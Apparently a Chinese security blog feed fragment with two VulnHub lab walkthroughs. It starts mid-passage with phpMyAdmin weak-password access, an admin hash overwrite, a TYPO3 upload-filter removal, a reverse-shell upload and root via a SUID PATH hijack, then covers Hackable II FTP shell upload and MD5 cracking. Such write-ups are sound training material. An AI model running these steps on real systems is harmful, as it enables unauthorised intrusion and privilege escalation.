&lt;p&gt;打开 http://192.168.0.153:8080 搜集信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-666.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 http://192.168.0.153:8081 搜集信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-667.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-668.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次打开收集到的目录看能否找到更多信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODAvcGhwaW5mby5waHA=&#34;&gt;http://192.168.31.176:8080/phpinfo.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-669.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8081&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-670.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;phpmyadmin-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-渗透测试&#34;&gt;#&lt;/a&gt; phpmyadmin 渗透测试&lt;/h3&gt;
&lt;p&gt;发现敏感地址，phpmyadmin 存在弱口令&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODEvcGhwbXlhZG1pbi8=&#34;&gt;http://192.168.31.176:8081/phpmyadmin/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-671.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用弱口令 root：root 登陆成功拿到后台的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-672.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对 phpmyadmin 进行写 shell 拿网站权限&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-673.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;是否可以写入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为/var/lib/mysql-files，只允许导出到此目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-674.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否开启日志记录以及日志保存目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHOW VARIABLES LIKE &amp;#x27;%general_log%&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为OFF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-675.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启写入日志的开关：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log = &amp;quot;ON&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-676.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看设置是否正确，是否开启成功，检测到已经开启了日志写入，并且写入的地址在下面的文件中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-677.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改默认的日志写入地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log_file=“1.php”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-678.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; phpmyadmin 拿 shell 失败，得采用其他的方式&lt;/p&gt;
&lt;h3 id=&#34;覆盖admin密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#覆盖admin密码&#34;&gt;#&lt;/a&gt; 覆盖 admin 密码&lt;/h3&gt;
&lt;p&gt;查看 sql 之后看到密码采用 argon 算法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-679.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然数据的密码采用的是 argon 的算法加密的，那么现在的思路就是通过 argon 算法生成一个加密后的密码并且替代原来的密码&lt;br&gt;
在网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2FyZ29uMi1jZmZpLw==&#34;&gt;https://pypi.org/project/argon2-cffi/&lt;/span&gt; 上看到了 argron2 的生成教程&lt;br&gt;
通过 python 依次输入以下的命令可以将自定义的密码以 argon 加密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-680.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 pip 来安装 argon： &lt;code&gt;python3 -m pip install argon2-cffi&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-681.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;打开python的命令行，依次输入以下命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from argon2 import PasswordHasher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ph = PasswordHasher()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hash = ph.hash(&amp;quot;typo&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hash)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-682.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打印出来的即为密码为 typo 的 argon 算法之后的加密字符:&lt;br&gt;
 &lt;code&gt;$argon2id$v=19$m=65536,t=3,p=4$BLSCVncgUy7tfYFMab+XMQ$LDy6bITURoFWRdb4JNHQ53e+t2TF9oiWeBdzLxHVoUM&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;打开数据库中修改用户名密码的位置，将上述产生的 typo 加密后的字符替换原先的密码，点击确定即修改成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-683.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 现在就有了一个用户名密码分别为 admin:typo 的组合&lt;/p&gt;
&lt;p&gt;但是这个账户应该在哪个位置登陆还不确定，看起来像是一个网站后台的登陆地址；继续之前 80 端口的网站目录扫描，发现了一个 /typo3 的后台地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-684.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;（这里换了地方测试，重启了机器，重新分配了 ip 地址，靶机的 ip 地址发生了变化，正常的操作 ip 地址是不会发生变化的）&lt;br&gt;
用 admin：typo 进入此后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-685.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了后台地址&lt;/p&gt;
&lt;h3 id=&#34;修改过滤规则上传木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改过滤规则上传木马&#34;&gt;#&lt;/a&gt; 修改过滤规则上传木马&lt;/h3&gt;
&lt;p&gt;进入后台之后看到是一个普通的后台管理地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-686.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 fileList 中找到了可以上传的位置，并且注明了上传文件的位置在 fileadmin 目录下，尝试从这个位置上传一个 php 后门&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-687.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;准备好 php 一句话木马，这里的 php 木马来源于 kali 机器上默认的木马，由于提前将此后门放在了公网 ip 上，就在自己的公网 ip 上直接拉下来即可，修改其主机和端口号为 kali 机器的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-688.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击上传文件，从本地选择 php 文件后，发现服务器拒绝了，说明有判断需要尝试绕过，可以用 00 截断的方式，这个地方尝试去寻找过滤文件的方式是否在后台能修改，进行绕过&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-689.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在设置里边查找，看到了 Configure Installation-Wide Options 中有关于文件上传的格式限制，其正则表示如下：&lt;br&gt;
 &lt;code&gt;\.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-690.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将原有的过滤规则全部清除&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-691.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;确定之后，接下来文件上传将不会受到任何限制&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-692.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次尝试上传 shell.php 就上传成功了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-693.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听木马文件中的端口，同时去执行上传成功的木马，成功拿到网站权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-694.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-695.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用一些命令将终端变为一个标准的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-696.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep www&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;判断出来没有其他的用户，需要直接拿到 root 的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-697.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看定时任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-698.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现没有任何任务被加载&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否有设置错误的s权限的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-699.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到一个 apache2-restart&lt;/p&gt;
&lt;h3 id=&#34;文件权限设置错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件权限设置错误提权&#34;&gt;#&lt;/a&gt; 文件权限设置错误提权&lt;/h3&gt;
&lt;p&gt;很显然这是一个自己封装的命令，需要进行读取或者反编译这个命令里边封装了哪些命令，通过 strings 将命令读取&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-700.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是一个 service 的命令，意味着我们去执行 apache 2-restart 命令的时候，会去环境变量里边去找 service，而且去执行这个 service 的时候是以 root 权限执行的，&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过修改环境变量提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/bin/bash&amp;quot; &amp;gt; /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/tmp/:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/local/apache2-restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-701.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</id>
        <title>VULNHUB 24 HACKABLELL</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==&#34;&gt;https://www.vulnhub.com/entry/hackable-ii,711/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz&#34;&gt;https://blog.csdn.net/weixin_44687621/article/details/119386683&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-564.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.6&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.6&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-565.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-566.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.6&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-567.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;只看到了一个目录，是 files 文件夹，直接访问此链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=&#34;&gt;http://192.168.31.6/files/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-568.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看此文件指向地址的详细内容:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=&#34;&gt;http://192.168.31.6/files/CALL.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-569.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;审查源代码，查看更多的关键信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;网站信息收集之后没有什么关键的信息&lt;/p&gt;
&lt;h3 id=&#34;ftp-匿名下载上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名下载上传&#34;&gt;#&lt;/a&gt; FTP 匿名下载上传&lt;/h3&gt;
&lt;p&gt;对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息&lt;/p&gt;
&lt;p&gt;ftp 192.168.31.6&lt;br&gt;
get CALL.html&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-572.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-573.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站&lt;br&gt;
 &lt;code&gt;cp /usr/share/webshells/php/php-reverse-shell.php .&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;修改监听 ip 地址和端口号为攻击机&lt;br&gt;
 &lt;code&gt;cat shell.php | head -n 55 | tail -n 10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-574.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-575.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;md5-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5-解密&#34;&gt;#&lt;/a&gt; MD5 解密&lt;/h3&gt;
&lt;p&gt;查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-577.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;解密这个 md5，得到 onion。猜测这是 ssh 的登录密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-578.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudopython3提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopython3提权&#34;&gt;#&lt;/a&gt; sudo (python3) 提权&lt;/h3&gt;
